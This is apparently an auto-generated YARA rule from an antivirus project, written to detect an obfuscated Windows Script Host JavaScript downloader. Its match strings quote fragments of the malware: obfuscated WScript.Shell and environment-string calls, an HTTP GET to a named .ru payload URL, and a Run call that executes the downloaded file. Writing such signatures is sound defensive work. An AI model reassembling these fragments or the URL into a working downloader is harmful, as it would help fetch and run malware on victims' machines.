rule sig_20160427_ae6732e51a2460bf31322543bfa0c88d {
  meta:
    description = "datamaliciousorder - file 20160427_ae6732e51a2460bf31322543bfa0c88d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9e8339264c1910d4d2e2ad3f4bc3d836312bae8905940fbb4c05ef2d914d1ed5"

  strings:
    $s1  = "function GwzmcTnsqi() {return AwopbHfkxw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"w3FaT5p" ascii
    $s2  = "function GwzmcTnsqi() {return AwopbHfkxw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"w3FaT5p" ascii
    $s3  = "var AwopbHfkxw = function MzuciSqxbo() {return GtnsjCvgbd[AyucwPwmtp](\"WScript\"+\".Shell\");}(), JjpemZnbic = 11;" fullword ascii
    $s4  = "function TzndmLfbqc(QiuxmXybpp, ZpehnBisic){MkadnFulgo = MkadnFulgo * 1; return QiuxmXybpp - ZpehnBisic;};" fullword ascii
    $s5  = "VfwqnAzvby[IhjtnIezta](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var GtnsjCvgbd = this[\"WScript\"];" fullword ascii
    $s7  = "function KztmpRjsxb() {return ((ChasuVtwph == true) && (ChasuVtwph == AirtgGdqvc)) ? 1 : MkadnFulgo;};" fullword ascii
    $s8  = "if (VfwqnAzvby[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function ItdtySlybd(){return EmiakCjcvf + \"\";};" fullword ascii
    $s10 = "EfmevQsbyc = true;" fullword ascii
    $s11 = "function RlidcOlxcu()" fullword ascii
    $s12 = "var GplbsBuhhz = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "AirtgGdqvc = true; " fullword ascii
    $s14 = "ChasuVtwph = true; " fullword ascii
    $s15 = "}while (PcpfjYweir);" fullword ascii
    $s16 = "var AirtgGdqvc = false;" fullword ascii
    $s17 = "function ZmpofDhaxi(NhcidWxdmj){AwopbHfkxw[\"R\"+\"un\"](NhcidWxdmj, MkadnFulgo, MkadnFulgo);};" fullword ascii
    $s18 = "function OglyeKmkaj(){return AyucwPwmtp;};" fullword ascii
    $s19 = "var ChasuVtwph = false;" fullword ascii
    $s20 = "var EfmevQsbyc = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}